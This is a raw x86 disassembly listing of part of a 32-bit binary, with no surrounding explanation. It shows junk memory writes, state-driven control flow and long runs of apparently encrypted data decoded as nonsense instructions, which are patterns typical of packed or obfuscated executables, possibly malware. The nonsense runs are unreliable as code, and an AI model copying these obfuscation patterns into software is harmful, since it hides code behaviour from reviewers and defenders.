  40e34b:	add    DWORD PTR ds:0x4336d3,0x4336df
  40e355:	sub    eax,DWORD PTR [ebp+0x8]
  40e358:	xor    DWORD PTR ds:0x433727,0x7a28
  40e362:	push   eax
  40e363:	sbb    DWORD PTR ds:0x433753,0x14e6
  40e36d:	mov    eax,DWORD PTR [ebp-0x4]
  40e370:	mov    DWORD PTR ds:0x433757,0x5b5
  40e37a:	add    eax,DWORD PTR [ebp+0x8]
  40e37d:	push   eax
  40e37e:	call   0x4032fa
  40e383:	mov    DWORD PTR ds:0x433683,0x5b4b
  40e38d:	inc    DWORD PTR [ebp+0x8]
  40e390:	cmp    DWORD PTR [ebp+0x8],0x52
  40e394:	mov    DWORD PTR ds:0x433683,0x3dd6
  40e39e:	jb     0x40e348
  40e3a4:	mov    DWORD PTR ds:0x433717,0x7cb6
  40e3ae:	jmp    0x40e830
  40e3b3:	mov    DWORD PTR ds:0x433683,0x6b28
  40e3bd:	cmp    edi,0x1a3
  40e3c3:	mov    DWORD PTR ds:0x43372f,0x27e
  40e3cd:	jne    0x40e58c
  40e3d3:	movzx  eax,BYTE PTR ds:0x4337ab
  40e3da:	and    DWORD PTR ds:0x43368b,eax
  40e3e0:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40e3e7:	add    DWORD PTR ds:0x4336e3,0x2f92
  40e3f1:	mov    eax,DWORD PTR [ebp-0x4]
  40e3f4:	mov    DWORD PTR [ebp-0x5c],eax
  40e3f7:	mov    eax,DWORD PTR [ebp-0x8]
  40e3fa:	mov    DWORD PTR [ebp-0x58],eax
  40e3fd:	and    eax,DWORD PTR ds:0x433793
  40e403:	jmp    0x40e53c
  40e408:	test   al,0xb5
  40e40a:	test   al,0xe6
  40e40c:	mov    cl,0xe3
  40e40e:	jo     0x40e481
  40e410:	stc    
  40e411:	ret    0x425b
  40e414:	jmp    0x172a6287
  40e419:	cwde   
  40e41a:	jle    0x40e49a
  40e41c:	adc    bh,BYTE PTR [edi+0x7e]
  40e41f:	jle    0x40e3b0
  40e421:	inc    ebp
  40e422:	popa   
  40e423:	fucomp st(3)
  40e425:	mov    ebp,0x8fb63480
  40e42a:	clc    
  40e42b:	sbb    BYTE PTR [edi],0x40
  40e42e:	jge    0x40e44b
  40e430:	xor    eax,DWORD PTR [ebp-0x41]
  40e433:	aad    0x60
  40e435:	mov    eax,0x5f8f0ef7
  40e43a:	mov    bh,0x8e
  40e43c:	push   cs
  40e43d:	(bad)  
  40e43e:	sti    
  40e43f:	or     esp,eax
  40e441:	imul   edi,DWORD PTR [edi],0x81634d2c
  40e447:	fwait
  40e448:	sbb    bl,BYTE PTR [eax-0x38]
  40e44b:	xor    al,0x19
  40e44d:	(bad)  
  40e44e:	imul   edx,DWORD PTR [edx],0x7e51feeb
  40e454:	mov    ecx,DWORD PTR [edi+eax*1]
  40e457:	pushf  
  40e458:	inc    esi
  40e459:	xchg   ebx,eax
  40e45a:	mov    al,0xaa
  40e45c:	leave  
  40e45d:	jecxz  0x40e48d
  40e45f:	push   edi
  40e460:	mov    al,ds:0xf4d0ebae
  40e465:	mov    esi,0x7bf88d9c
  40e46a:	adc    dh,bh
  40e46c:	inc    esp
  40e46d:	xor    eax,0xe2b28085
  40e472:	ja     0x40e433
  40e474:	repnz lahf 
  40e476:	into   
  40e477:	adc    BYTE PTR [edx],dh
  40e479:	call   0x2593d74e
  40e47e:	mov    cs,WORD PTR [ebx-0x53143a3d]
  40e484:	jb     0x40e4a7
  40e486:	mov    eax,0x9a562823
  40e48b:	cdq    
  40e48c:	jns    0x40e4bc
  40e48e:	test   al,0x6b
  40e490:	(bad)  
  40e491:	pop    ecx
  40e492:	shr    BYTE PTR [edx],cl
  40e494:	bound  esi,QWORD PTR [ebx-0x28e6e5bc]
  40e49a:	xor    bl,ch
  40e49c:	mov    ebp,0xed55b584
  40e4a1:	cmp    eax,0x559ce48b
  40e4a6:	clc    
  40e4a7:	cs mov ch,0xd9
  40e4aa:	std    
  40e4ab:	lods   al,BYTE PTR ds:[esi]
  40e4ac:	push   ecx
  40e4ad:	adc    DWORD PTR [ecx],edi
  40e4af:	icebp  
  40e4b0:	push   ebx
  40e4b1:	mov    al,ds:0xc4bf9fb9
  40e4b6:	inc    ecx
  40e4b7:	jp     0x40e4f4
  40e4b9:	cli    
  40e4ba:	loope  0x40e4e4
  40e4bc:	pop    esp
  40e4bd:	sub    DWORD PTR [eax-0x22],ebp
  40e4c0:	mov    BYTE PTR [eax+eax*1-0x4d],cl
  40e4c4:	mov    fs,WORD PTR [ebx]
  40e4c6:	aas    
  40e4c7:	sub    cl,BYTE PTR [ecx-0x3]
  40e4ca:	arpl   WORD PTR [eax],bx
  40e4cc:	xor    DWORD PTR [eax],0x45cca1a7
  40e4d2:	mov    dl,BYTE PTR [esi+0x7a41ec5b]
  40e4d8:	shl    BYTE PTR ds:0x7553d5e7,cl
  40e4de:	pop    DWORD PTR ds:0x3d381022
  40e4e4:	jne    0x40e4c9
  40e4e6:	xchg   DWORD PTR [ebx],ebx
  40e4e8:	ror    BYTE PTR [ebx],0x10
  40e4eb:	fsubr  QWORD PTR cs:[eax]
  40e4ee:	xchg   ecx,eax
  40e4ef:	mov    esp,0xb8d15f6
  40e4f4:	add    al,0x97
  40e4f6:	mov    cs,WORD PTR [ecx]
  40e4f8:	loopne 0x40e532
  40e4fa:	inc    edx
  40e4fb:	pop    ecx
  40e4fc:	pushf  
  40e4fd:	and    al,0xea
  40e4ff:	sub    DWORD PTR [edx-0x11865fa6],esp
  40e505:	fs stc 
  40e507:	hlt    
  40e508:	out    dx,al
  40e509:	or     eax,eax
  40e50b:	inc    ebx
  40e50c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e50d:	dec    eax
  40e50e:	icebp  
  40e50f:	(bad)  [edi+0x1c]
  40e512:	mov    BYTE PTR [eax+0x4e40243c],dl
  40e518:	in     eax,dx
  40e519:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e51a:	or     al,0xdf
  40e51c:	and    bl,ah
  40e51e:	call   0x369d:0xc46680e
  40e525:	push   edx
  40e526:	test   al,0xbc
  40e528:	bound  ebx,QWORD PTR [edx+0x64]
  40e52b:	inc    ebp
  40e52c:	adc    bh,cl
  40e52e:	mov    edi,0xba86713b
  40e533:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e534:	and    al,0x1e
  40e536:	jnp    0x40e51b
  40e538:	fst    QWORD PTR [edx-0x36]
  40e53b:	fwait
  40e53c:	mov    eax,DWORD PTR [ebp-0xc]
  40e53f:	or     DWORD PTR ds:0x433723,0x43376b
  40e549:	xor    eax,esi
  40e54b:	add    eax,ebx
  40e54d:	sbb    DWORD PTR ds:0x43375b,0x43372f
  40e557:	mov    DWORD PTR [ebp-0x54],eax
  40e55a:	lea    eax,[ebp-0x1c]
  40e55d:	mov    DWORD PTR [ebp-0x50],eax
  40e560:	mov    eax,DWORD PTR [ebp-0x60]
  40e563:	xor    eax,esi
  40e565:	add    eax,ebx
  40e567:	mov    DWORD PTR [ebp-0x60],eax
  40e56a:	lea    eax,[ebp-0x60]
  40e56d:	push   eax
  40e56e:	mov    eax,DWORD PTR [ebp+0xc]
  40e571:	xor    eax,esi
  40e573:	add    eax,ebx
  40e575:	push   eax
  40e576:	mov    eax,ds:0x413b54
  40e57b:	push   0x413aaa
  40e580:	push   DWORD PTR [eax]
  40e582:	call   0x40984d
  40e587:	jmp    0x40e830
  40e58c:	cmp    edi,0x13d
  40e592:	jne    0x40e830
  40e598:	mov    eax,DWORD PTR [ebp-0x10]
  40e59b:	xor    eax,esi
  40e59d:	add    eax,ebx
  40e59f:	mov    DWORD PTR [ebp+0x8],eax
  40e5a2:	jmp    0x40e6db
  40e5a7:	shl    BYTE PTR [eax+eax*8-0xf8f9fd0],0x74
  40e5af:	sub    eax,0xddf261b8
  40e5b4:	mov    bl,0xa3
  40e5b6:	jo     0x40e5e2
  40e5b8:	cdq    
  40e5b9:	jle    0x40e639
  40e5bb:	adc    bh,BYTE PTR [edi+0x7e]
  40e5be:	jle    0x40e610
  40e5c0:	adc    dl,cl
  40e5c2:	mov    DWORD PTR [ecx+0x591f03b0],ebp
  40e5c8:	retf   0x73ce
  40e5cb:	xor    BYTE PTR ss:[esi-0x6a],0xbc
  40e5d0:	div    BYTE PTR [ebp+ecx*1+0x35c14072]
  40e5d7:	sub    cl,BYTE PTR [edi+0x3449338a]
  40e5dd:	out    0xee,eax
  40e5df:	dec    edx
  40e5e0:	mov    edi,0x80b72cb7
  40e5e5:	dec    esi
  40e5e6:	mov    al,BYTE PTR [ebp-0x38]
  40e5e9:	mov    bl,0xc9
  40e5eb:	or     BYTE PTR [ebx+0x5f],bh
  40e5ee:	push   cs
  40e5ef:	pushf  
  40e5f0:	pop    edi
  40e5f1:	adc    al,BYTE PTR [esi-0x639e7fa6]
  40e5f7:	sahf   
  40e5f8:	xor    dl,dh
  40e5fa:	xchg   esp,eax
  40e5fb:	sub    esi,DWORD PTR gs:[ebx+0x5e6f2803]
  40e602:	loopne 0x40e666
  40e604:	lods   eax,DWORD PTR ds:[esi]
  40e605:	pop    eax
  40e606:	loop   0x40e624
  40e608:	dec    eax
  40e609:	jo     0x40e5a3
  40e60b:	lods   eax,DWORD PTR ds:[esi]
  40e60d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e60e:	cs call 0x1f64:0xd6987445
  40e616:	adc    al,0x6f
  40e618:	test   bl,ch
  40e61a:	add    eax,0xf3d2d421
  40e61f:	add    cl,BYTE PTR [ecx]
  40e621:	fst    DWORD PTR [edx+0x8]
  40e624:	dec    ecx
  40e625:	push   es
  40e626:	push   ebx
  40e627:	sbb    ebp,0xffffff86
  40e62a:	sub    BYTE PTR [ebx+ebx*4-0x66],ah
  40e62e:	jno    0x40e5e0
  40e630:	sahf   
  40e631:	loop   0x40e633
  40e633:	cmp    al,0xd9
  40e635:	mov    al,ds:0x3961b9f2
  40e63a:	enter  0xa678,0xfc
  40e63e:	push   esi
  40e63f:	rcl    DWORD PTR [ebp-0x67],cl
  40e642:	cmp    DWORD PTR [edi],eax
  40e644:	loop   0x40e6a9
  40e646:	xchg   edx,eax
  40e647:	pop    ebx
  40e648:	mov    BYTE PTR [esi+ecx*8+0x668ed991],bh
  40e64f:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40e651:	xchg   edi,eax
  40e652:	jmp    0x7fe44d16
  40e657:	ficom  WORD PTR [ebx+esi*2-0x66]
  40e65b:	inc    eax
  40e65c:	mov    cs,eax
  40e65e:	daa    
  40e65f:	cmp    bl,ch
  40e661:	sub    cl,BYTE PTR [edi-0x7e1360d0]
  40e667:	retf   0xc0e8
  40e66a:	mov    esp,DWORD PTR [ebp+0x13]
  40e66d:	scas   al,BYTE PTR es:[edi]
  40e66e:	test   ah,cl
  40e670:	and    al,BYTE PTR [ebx]
  40e672:	cmp    eax,0x14e44229
  40e677:	mov    edx,0xf8958e4c
  40e67c:	jmp    0x4e97df14
  40e681:	lods   al,BYTE PTR ds:[esi]
  40e682:	lock jo 0x40e6fc
  40e685:	jmp    0x3fd8f618
  40e68a:	dec    ecx
  40e68b:	mov    esi,0x38c08940
  40e690:	pop    eax
  40e691:	imul   edx,DWORD PTR cs:[ebx+ecx*1-0x78],0x81226cfe
  40e69a:	cmp    dh,bl
  40e69c:	sub    BYTE PTR [ecx],cl
  40e69e:	sbb    DWORD PTR [eax-0x7f12ac30],edi
  40e6a4:	loope  0x40e6a3
  40e6a6:	shl    ch,0xf4
  40e6a9:	in     al,dx
  40e6aa:	jmp    0x20c8:0xaa6ebe7
  40e6b1:	ss push esi
  40e6b3:	retf   
  40e6b4:	sbb    BYTE PTR [ebx-0x2bd57d16],bh
  40e6ba:	mov    cl,0xdb
  40e6bc:	ret    
  40e6bd:	aad    0xa1
  40e6bf:	mov    edi,0xc491bf1d
  40e6c4:	ror    BYTE PTR [edx-0x6177429f],1
  40e6ca:	pop    ds
  40e6cb:	pop    esp
  40e6cc:	jmp    0x5a6e1528
  40e6d1:	sub    DWORD PTR [edx-0x50a5e7f9],esi
  40e6d7:	push   ebp
  40e6d8:	mov    ebp,0x34a151e6
  40e6dd:	cmp    eax,DWORD PTR [ecx+0x0]
  40e6e0:	mov    DWORD PTR [ebp+0x8],eax
  40e6e3:	mov    eax,DWORD PTR [ebp-0x14]
  40e6e6:	jmp    0x40e81f
  40e6eb:	jb     0x40e70f
  40e6ed:	lods   al,BYTE PTR ds:[esi]
  40e6ee:	jmp    0x9bdf:0xa270706c
  40e6f5:	mov    al,BYTE PTR [ecx-0x3ea9c503]
  40e6fb:	into   
  40e6fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6fd:	jle    0x40e77d
  40e6ff:	adc    bh,BYTE PTR [edi+0x7e]
  40e702:	jle    0x40e6db
  40e704:	sub    eax,0x42b7531d
  40e709:	jp     0x40e6fd
  40e70b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e70c:	scas   al,BYTE PTR es:[edi]
  40e70d:	or     al,0xef
  40e70f:	inc    esi
  40e710:	mov    edx,0xab88b438
  40e715:	push   esp
  40e716:	add    bh,BYTE PTR [ebp+0x533453ea]
  40e71c:	mov    WORD PTR [eax+0x27],?
  40e71f:	shl    al,cl
  40e721:	sbb    al,0xeb
  40e723:	sbb    al,0xb
  40e725:	ror    edx,0x32
  40e728:	pop    ds
  40e729:	mov    al,ds:0x45e5db05
  40e72e:	add    eax,0xb5803b1c
  40e733:	pop    eax
  40e734:	mov    edx,0x6faadb3c
  40e739:	pop    esp
  40e73a:	repnz cmp eax,0x3c22584a
  40e740:	inc    esi
  40e741:	sub    DWORD PTR [ebx],0xfffffff8
  40e744:	or     BYTE PTR [ebp+0x4de875b7],dh
  40e74a:	and    DWORD PTR [eax],edi
  40e74c:	push   ds
  40e74d:	pusha  
  40e74e:	mov    al,0x28
  40e750:	daa    
  40e751:	ins    BYTE PTR es:[edi],dx
  40e752:	jmp    FWORD PTR [edi]
  40e754:	fbstp  TBYTE PTR [ebx-0x64]
  40e757:	ret    
  40e758:	(bad)  
  40e759:	out    dx,eax
  40e75a:	repz dec esp
  40e75c:	call   0x83963994
  40e761:	ins    DWORD PTR es:[edi],dx
  40e762:	aad    0x21
  40e764:	inc    esi
  40e765:	sub    eax,0x3195c9cd
  40e76a:	outs   dx,DWORD PTR ds:[esi]
  40e76b:	aam    0x96
  40e76d:	sahf   
  40e76e:	jnp    0x40e731
  40e770:	push   esp
  40e771:	cmp    eax,0xf6bbbe9d
  40e776:	test   al,0xe0
  40e778:	and    eax,0x5cec25a7
  40e77d:	scas   al,BYTE PTR es:[edi]
  40e77e:	fstp   QWORD PTR ds:0x413adc77
  40e784:	sub    edx,DWORD PTR [edi+0xb208cb0]
  40e78a:	(bad)  [ebx+0x33611960]
  40e790:	call   DWORD PTR [ebx]
  40e792:	jb     0x40e789
  40e794:	jp     0x40e7a6
  40e796:	add    eax,DWORD PTR [ebp-0x4a563132]
  40e79c:	fisubr DWORD PTR [esi+0x225cb2bc]
  40e7a2:	jp     0x40e7e4
  40e7a4:	aaa    
  40e7a5:	add    BYTE PTR [edi],al
  40e7a7:	pusha  
  40e7a8:	push   0xf
  40e7aa:	sbb    bl,BYTE PTR [eax+eax*8]
  40e7ad:	mov    DWORD PTR [ebx-0x751492fa],edi
  40e7b3:	stc    
  40e7b4:	pop    ebx
  40e7b5:	sbb    ebp,edx
  40e7b7:	cmc    
  40e7b8:	int    0x86
  40e7ba:	out    dx,al
  40e7bb:	mov    al,0xd9
  40e7bd:	mov    WORD PTR [esi],cs
  40e7bf:	xor    ebx,DWORD PTR [edx+edx*8+0x38]
  40e7c3:	or     al,0x2e
  40e7c5:	ins    DWORD PTR es:[edi],dx
  40e7c6:	or     al,0x94
  40e7c8:	pop    ss
  40e7c9:	out    dx,eax
  40e7ca:	ret    0xe8e5
  40e7cd:	add    DWORD PTR [edi],0xe
  40e7d0:	sbb    cl,BYTE PTR ds:0x25a60596
  40e7d6:	add    esi,esi
  40e7d8:	outs   dx,DWORD PTR ds:[esi]
  40e7d9:	push   ebp
  40e7da:	sbb    esp,DWORD PTR [edx-0x5d797dea]
  40e7e0:	mov    ?,WORD PTR [ecx+0x2701c2c]
  40e7e6:	out    dx,al
  40e7e7:	push   eax
  40e7e8:	push   edi
  40e7e9:	rcl    BYTE PTR [eax-0xf5e582],cl
  40e7ef:	outs   dx,DWORD PTR ds:[esi]
  40e7f0:	push   ss
  40e7f1:	aaa    
  40e7f2:	test   esp,edi
  40e7f4:	mov    esi,0xa1791ff6
  40e7f9:	jp     0x40e813
  40e7fb:	mov    ebp,0x867e880e
  40e800:	loope  0x40e842
  40e802:	mov    ebx,0xf686348
  40e807:	cmc    
  40e808:	push   eax
  40e809:	imul   ebx,DWORD PTR [edi+0x62],0x1accaf68
  40e810:	mov    ch,0x71
  40e812:	add    ah,BYTE PTR [edx+0x2d]
  40e815:	mov    al,ds:0x710c035
  40e81a:	dec    esi
  40e81b:	fld    DWORD PTR [edi]
  40e81d:	int    0x92
  40e81f:	mov    DWORD PTR [ebp-0x4],eax
  40e822:	mov    eax,DWORD PTR [ebp-0x4]
  40e825:	push   0x4
  40e827:	pop    ecx
  40e828:	sub    ecx,eax
  40e82a:	add    ecx,DWORD PTR [ebp-0x18]
  40e82d:	mov    DWORD PTR [ebp-0x8],ecx
  40e830:	mov    eax,DWORD PTR [ebp+0xc]
  40e833:	xor    eax,esi
  40e835:	lea    edi,[edi+eax*1+0x32729b]
  40e83c:	cmp    edi,0x50b
  40e842:	jmp    0x40e97b
  40e847:	xor    al,0xd8
  40e849:	xchg   ebx,eax
  40e84a:	das    
  40e84b:	push   ebx
  40e84c:	jne    0x40e7fe
  40e84e:	loope  0x40e887
  40e850:	jecxz  0x40e800
  40e852:	loope  0x40e843
  40e854:	ins    DWORD PTR es:[edi],dx
  40e855:	pushf  
  40e856:	psrad  mm4,QWORD PTR [edi+0x7f127e7e]
  40e85d:	jle    0x40e8dd
  40e85f:	pop    es
  40e860:	stos   BYTE PTR es:[edi],al
  40e861:	sbb    BYTE PTR [ebx-0x52],bh
  40e864:	mov    ch,0x16
  40e866:	jge    0x40e884
  40e868:	addr16 js 0x40e84a
  40e86b:	mov    eax,ds:0x7b6ab19c
  40e870:	push   eax
  40e871:	mov    esp,0xd8acada3
  40e876:	jb     0x40e8cc
  40e878:	adc    eax,0xcd3f82cc
  40e87d:	push   0x64
  40e87f:	test   eax,0x268dae35
  40e884:	(bad)  
  40e885:	push   edi
  40e886:	xchg   dl,dl
  40e888:	hlt    
  40e889:	fdiv   QWORD PTR [edi]
  40e88b:	jecxz  0x40e855
  40e88d:	popf   
  40e88e:	or     BYTE PTR ds:0xa4f33ef0,0x50
  40e895:	in     eax,dx
  40e896:	lea    edi,[ebx]
  40e898:	ins    BYTE PTR es:[di],dx
  40e89a:	std    
  40e89b:	pop    DWORD PTR [ebx+0x2195220f]
  40e8a1:	mov    ebx,ecx
  40e8a3:	jecxz  0x40e8f4
  40e8a5:	dec    ebx
  40e8a6:	cld    
  40e8a7:	mov    ?,WORD PTR [edx+0x78ee70ad]
  40e8ad:	in     eax,dx
  40e8ae:	adc    DWORD PTR [eax+0x78],ecx
  40e8b1:	mov    dh,0x6d
  40e8b3:	jne    0x40e8ca
  40e8b5:	jmp    0xdfc6:0x28b6f055
  40e8bc:	ins    DWORD PTR es:[edi],dx
  40e8bd:	int3   
  40e8be:	cwde   
  40e8bf:	fbstp  TBYTE PTR ds:0x3e1927a8
  40e8c5:	adc    DWORD PTR [esi+ebx*1+0x32],esp
  40e8c9:	into   
  40e8ca:	sahf   
  40e8cb:	and    al,0xb4
  40e8cd:	enter  0x3dfe,0x79
  40e8d1:	in     al,dx
  40e8d2:	cmp    al,0x28
  40e8d4:	mov    BYTE PTR [ecx+0x1d],0xb4
  40e8d8:	sbb    ebx,eax
  40e8da:	xor    bh,BYTE PTR [ecx]
  40e8dc:	stos   DWORD PTR es:[edi],eax
  40e8dd:	push   0x1a
  40e8df:	adc    eax,0xfa9f8aed
  40e8e4:	int3   
  40e8e5:	and    eax,0x985084bc
  40e8ea:	icebp  
  40e8eb:	cmp    al,0xb
  40e8ed:	fmul   QWORD PTR [edi-0x5]
  40e8f0:	std    
  40e8f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8f2:	push   0x62bdc055
  40e8f7:	mov    ds:0x17084db,al
  40e8fc:	cwde   
  40e8fd:	stc    
  40e8fe:	mov    ecx,0xaed85cbf
  40e903:	push   edi
  40e904:	call   DWORD PTR [edx-0x9]
  40e907:	ror    DWORD PTR [eax-0x5c],1
  40e90a:	in     al,dx
  40e90b:	outs   dx,BYTE PTR ds:[esi]
  40e90c:	inc    esp
  40e90d:	mov    esi,es
  40e90f:	mov    cl,ah
  40e911:	lock ds aad 0xd4
  40e915:	pop    ss
  40e916:	jno    0x40e901
  40e918:	es pop ecx
  40e91a:	cwde   
  40e91b:	scas   eax,DWORD PTR es:[edi]
  40e91c:	add    BYTE PTR [ebx],ch
  40e91e:	(bad)  
  40e91f:	arpl   WORD PTR [esi],cx
  40e921:	cmp    esi,DWORD PTR [eax]
  40e923:	jbe    0x40e8c8
  40e925:	ja     0x40e968
  40e927:	mov    esp,0xb5c91d95
  40e92c:	fdivr  st,st(0)
  40e92e:	mov    ds:0x4535266d,al
  40e933:	sbb    dl,BYTE PTR [edi+0x66d68cea]
  40e939:	inc    edx
  40e93a:	jmp    0x470313ae
  40e93f:	fwait
  40e940:	pop    edi
  40e941:	loope  0x40e938
  40e943:	(bad)  
  40e944:	cs inc edx
  40e946:	add    al,0x97
  40e948:	sbb    al,0x3e
  40e94a:	aaa    
  40e94b:	xchg   esp,eax
  40e94c:	jnp    0x40e95e
  40e94e:	mov    eax,ds:0xd28c5ab3
  40e953:	aas    
  40e954:	push   ss
  40e955:	pop    esp
  40e956:	rcl    DWORD PTR es:[ecx+0x78],0xee
  40e95b:	das    
  40e95c:	add    ebp,esi
  40e95e:	sub    bl,cl
  40e960:	mov    bh,0x7
  40e962:	mov    ebp,0x4da7c801
  40e967:	pusha  
  40e968:	add    dh,BYTE PTR [ebx-0x50]
  40e96b:	mov    eax,ds:0x9be8e1e
  40e970:	cmp    eax,0xea1d6a3c
  40e975:	je     0x40e9e7
  40e977:	mov    ah,0x55
  40e979:	fsub   DWORD PTR [edx-0x6c17af1]
  40e97f:	(bad)  
  40e980:	dec    DWORD PTR [ebx+0x335f0c45]
  40e986:	(bad)  
  40e987:	pop    esi
  40e988:	jmp    0x40eac1
  40e98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e98e:	sbb    bl,dh
  40e990:	loope  0x40ea05
  40e992:	icebp  
  40e993:	mov    ch,0x58
  40e995:	jns    0x40e920
  40e997:	add    eax,0x9e51531d
  40e99c:	cmp    BYTE PTR [esi+0x127e7ea4],al
  40e9a2:	jg     0x40ea22
  40e9a4:	jle    0x40e9d8
  40e9a6:	and    DWORD PTR [esi-0x6fb52d5d],edx
  40e9ac:	test   al,0xf9
  40e9ae:	lods   al,BYTE PTR ds:[esi]
  40e9af:	push   ds
  40e9b0:	cmp    DWORD PTR [ebx],esp
  40e9b2:	xlat   BYTE PTR ds:[ebx]
  40e9b3:	inc    eax
  40e9b4:	sahf   
  40e9b5:	pop    es
  40e9b6:	ss test al,0x7a
  40e9b9:	enter  0x99ef,0x96
  40e9bd:	leave  
  40e9be:	rol    ebp,0xd4
  40e9c1:	mov    ecx,0xa7ddf1f2
  40e9c6:	cmp    dl,cl
  40e9c8:	sbb    bl,ch
  40e9ca:	push   esi
  40e9cb:	jnp    0x40ea01
  40e9cd:	inc    esp
  40e9ce:	in     eax,0x9
  40e9d0:	popf   
  40e9d1:	push   eax
  40e9d2:	push   0x6a87f8a4
  40e9d7:	xchg   edi,eax
  40e9d8:	pop    ecx
  40e9d9:	shl    BYTE PTR [esi],cl
  40e9db:	push   ds
  40e9dc:	cmp    eax,DWORD PTR [esp+edx*2-0x71]
  40e9e0:	loop   0x40e9c0
  40e9e2:	push   DWORD PTR [ebx+0x45dc8e0e]
  40e9e8:	or     BYTE PTR [edx+0x35],dl
  40e9eb:	popa   
  40e9ec:	xor    al,0xea
  40e9ee:	mov    ch,0x5e
  40e9f0:	pop    ecx
  40e9f1:	sub    DWORD PTR [ebx+0x158bbbb6],ebx
  40e9f7:	retf   
  40e9f8:	xchg   BYTE PTR [ebx-0x73],cl
  40e9fb:	push   0x680d6a24
  40ea00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea01:	cwde   
  40ea02:	push   esp
  40ea03:	pop    eax
  40ea04:	jno    0x40ea05
  40ea06:	das    
  40ea07:	popf   
  40ea08:	adc    ch,al
  40ea0a:	mov    cl,ch
  40ea0c:	mov    ss,ebx
  40ea0e:	shr    BYTE PTR [edi-0x62],0x2e
  40ea12:	jge    0x40ea67
  40ea14:	push   ebx
  40ea15:	or     al,0x3b
  40ea17:	mov    dh,0x65
  40ea19:	mov    ecx,0xb509607
  40ea1e:	jmp    0xab6e:0x31157d54
  40ea25:	add    dl,BYTE PTR [edx-0x8]
  40ea28:	dec    edx
  40ea29:	ror    DWORD PTR [edx],0xc4
  40ea2c:	xor    eax,0xfb383a36
  40ea31:	xor    al,0x50
  40ea33:	and    bl,BYTE PTR ds:[esi-0x6db26d5b]
  40ea3a:	xchg   ebp,eax
  40ea3b:	jl     0x40ea2f
  40ea3d:	xchg   ecx,eax
  40ea3e:	push   cs
  40ea3f:	fdiv   QWORD PTR [edx+0xa]
  40ea42:	clc    
  40ea43:	push   edx
  40ea44:	sbb    al,0x6d
  40ea46:	pushf  
  40ea47:	int    0x62
  40ea49:	sbb    DWORD PTR [eax-0x3319ef96],edx
  40ea4f:	dec    esp
  40ea50:	dec    ecx
  40ea51:	aad    0xae
  40ea53:	rcr    DWORD PTR [ebx-0x1d],1
  40ea56:	in     al,dx
  40ea57:	pop    ss
  40ea58:	jge    0x40ea55
  40ea5a:	mov    edx,0x2466ac17
  40ea5f:	scas   al,BYTE PTR es:[edi]
  40ea60:	pop    ecx
  40ea61:	sub    al,0xd4
  40ea63:	dec    esi
  40ea64:	jge    0x40ea81
  40ea66:	sub    esi,DWORD PTR [eax-0x4c87e243]
  40ea6c:	aaa    
  40ea6d:	dec    DWORD PTR [edi+edi*2-0x7daff74b]
  40ea74:	push   0x2c3ed30c
  40ea79:	test   DWORD PTR [edx+0x3810ba09],esi
  40ea7f:	pop    edx
  40ea80:	jbe    0x40eaf4
  40ea82:	clc    
  40ea83:	jmp    0x40eaca
  40ea85:	sahf   
  40ea86:	xor    ch,BYTE PTR [esi-0x5b]
  40ea89:	push   ss
  40ea8a:	loop   0x40ea4e
  40ea8c:	sbb    DWORD PTR [edi],edi
  40ea8e:	sbb    esi,eax
  40ea90:	xor    esi,ebx
  40ea92:	retf   
  40ea93:	sbb    esi,DWORD PTR [edi]
  40ea95:	inc    ecx
  40ea96:	(bad)  
  40ea98:	rcl    BYTE PTR [ebx-0x5e],1
  40ea9b:	push   ss
  40ea9c:	pop    esp
  40ea9d:	pop    es
  40ea9e:	cdq    
  40ea9f:	pop    esi
  40eaa0:	xor    BYTE PTR [eax+0x17],al
  40eaa3:	cmp    al,bl
  40eaa5:	xchg   ecx,eax
  40eaa6:	xchg   edi,eax
  40eaa7:	cmp    cl,0xd
  40eaaa:	les    eax,FWORD PTR [ebx-0x64]
  40eaad:	sbb    edi,DWORD PTR [edx]
  40eaaf:	daa    
  40eab0:	cs out 0x19,al
  40eab3:	sbb    al,0x30
  40eab5:	fist   WORD PTR [ecx+0x4f]
  40eab8:	or     edx,DWORD PTR [ebx]
  40eaba:	mov    ah,0x30
  40eabc:	pop    eax
  40eabd:	popf   
  40eabe:	out    dx,eax
  40eabf:	or     al,0x7d
  40eac1:	add    eax,ebx
  40eac3:	pop    ebx
  40eac4:	leave  
  40eac5:	ret    0x8
  40eac8:	push   ebp
  40eac9:	mov    ebp,esp
  40eacb:	push   ecx
  40eacc:	mov    DWORD PTR ds:0x433713,0x1f
  40ead6:	cmp    DWORD PTR ds:0x433713,0x0
  40eadd:	je     0x40eb79
  40eae3:	cmp    DWORD PTR ds:0x433713,0xc
  40eaea:	jne    0x40eafe
  40eaf0:	push   0x1b35
  40eaf5:	push   DWORD PTR [ebp-0x14]
  40eaf8:	call   DWORD PTR ds:0x412368
  40eafe:	cmp    DWORD PTR ds:0x433713,0xd
  40eb05:	jne    0x40eb18
  40eb0b:	mov    edx,DWORD PTR ds:0x433713
  40eb11:	dec    edx
  40eb12:	mov    DWORD PTR ds:0x433713,edx
  40eb18:	mov    edx,DWORD PTR ds:0x433713
  40eb1e:	dec    edx
  40eb1f:	mov    DWORD PTR ds:0x433713,edx
  40eb25:	jmp    0x40ead6
  40eb2a:	mov    DWORD PTR ds:0x433753,0x16
  40eb34:	cmp    DWORD PTR ds:0x433753,0x0
  40eb3b:	je     0x40eb79
  40eb41:	cmp    DWORD PTR ds:0x433753,0x17
  40eb48:	jne    0x40eb5f
  40eb4e:	push   DWORD PTR [ebp-0x14]
  40eb51:	push   DWORD PTR [ebp-0xc]
  40eb54:	push   0x495a
  40eb59:	call   DWORD PTR ds:0x4120ec
  40eb5f:	mov    eax,ds:0x433753
  40eb64:	dec    eax
  40eb65:	mov    ds:0x433753,eax
  40eb6a:	jmp    0x40eb34
  40eb6f:	mov    DWORD PTR ds:0x433763,0x352
  40eb79:	push   ecx
  40eb7a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40eb81:	sbb    DWORD PTR ds:0x43371b,edx
